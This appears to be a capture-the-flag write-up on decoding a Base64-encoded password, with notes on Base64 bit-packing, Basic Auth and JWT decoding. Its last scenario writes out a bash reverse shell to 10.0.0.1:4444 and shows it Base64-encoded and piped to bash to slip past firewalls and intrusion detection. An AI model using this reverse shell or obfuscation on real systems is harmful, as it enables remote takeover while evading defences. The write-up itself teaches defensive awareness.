### Objective
Decode the Level 11 password stored in `data.txt`, which is encoded in Base64.

### Commands Used
```bash
base64 -d data.txt
# Alternative:
cat data.txt | base64 -d

----
## Core Concepts
- Base64 Bit-Packing: Converts 3 bytes (24 bits) into 4 printable ASCII characters (6 bits each), introducing ~33% data overhead.

- Data Transport Integrity: Ensures binary streams safely traverse legacy 7-bit ASCII transport protocols without control character corruption.

- Encoding vs. Encryption: Base64 offers zero cryptographic secrecy and can be decoded deterministically without a key.

----
Base64 Encoding MechanicsBase64 is a binary-to-text encoding scheme designed to represent binary data in an ASCII string format.Binary Input (3 Bytes / 24 bits):
[  Byte 1 (8b)  ] [  Byte 2 (8b)  ] [  Byte 3 (8b)  ]
        \             /     \             /
         \           /       \           /
[  6 bits  ] [  6 bits  ] [  6 bits  ] [  6 bits  ]
     ↓            ↓            ↓            ↓
 Char 1       Char 2       Char 3       Char 4
(Base64)     (Base64)     (Base64)     (Base64)
A. How the Bit Shifting Works (3 Bytes → 4 Characters):Takes 3 bytes (24 bits) of raw data.Divides those 24 bits into 4 chunks of 6 bits each ($2^6 = 64$ possible values).Maps each 6-bit integer (0 to 63) to a specific ASCII character from an index table:0–25 $\rightarrow$ A–Z26–51 $\rightarrow$ a–z52–61 $\rightarrow$ 0–962 $\rightarrow$ +63 $\rightarrow$ /Padding (=): If the input byte count is not divisible by 3:1 remaining byte (8 bits) $\rightarrow$ padded with zeros to make two 6-bit units, followed by two = padding characters (==).2 remaining bytes (16 bits) $\rightarrow$ padded with zeros to make three 6-bit units, followed by one = padding character (=).


# Real-World Security Scenarios
### Scenario 1: Encoding Is NOT Encryption

- The Vulnerability: A common misconception among junior developers is treating Base64 as encryption or security (e.g., storing base64(password) in databases, or passing Authorization: Basic <base64> over unencrypted HTTP).

- The Reality: Base64 provides zero confidentiality. Anyone can decode it instantly without a key. HTTP Basic Auth always requires TLS (https://) because the credentials can be decoded with one terminal command:

```bash
echo "dXNlcjpwYXNzd29yZDEyMw==" | base64 -d
Output: user:password123
```
## Scenario 2: JSON Web Tokens (JWT) & API Security

- Modern REST APIs and authentication systems use JWTs, which consist of three Base64URL-encoded components separated by dots: Header.Payload.Signature.

- Attackers and security testers decode the payload to inspect user roles, permissions, and expiration timestamps without needing the signing secret:

```Bash
echo "eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoiYWRtaW4ifQ" | base64 -d
# Output: {"sub":"123456","role":"admin"}
```
## Scenario 3: Payload Obfuscation in Threat Detection

- Attackers frequently encode shell commands, reverse shells, or web shells in Base64 to bypass naive string-matching web application firewalls (WAFs) or Intrusion Detection Systems (IDS):

```Bash
# Common reverse shell obfuscation seen in attack logs
echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" | base64
# Passed to target as: echo <base64> | base64 -d | bash
```
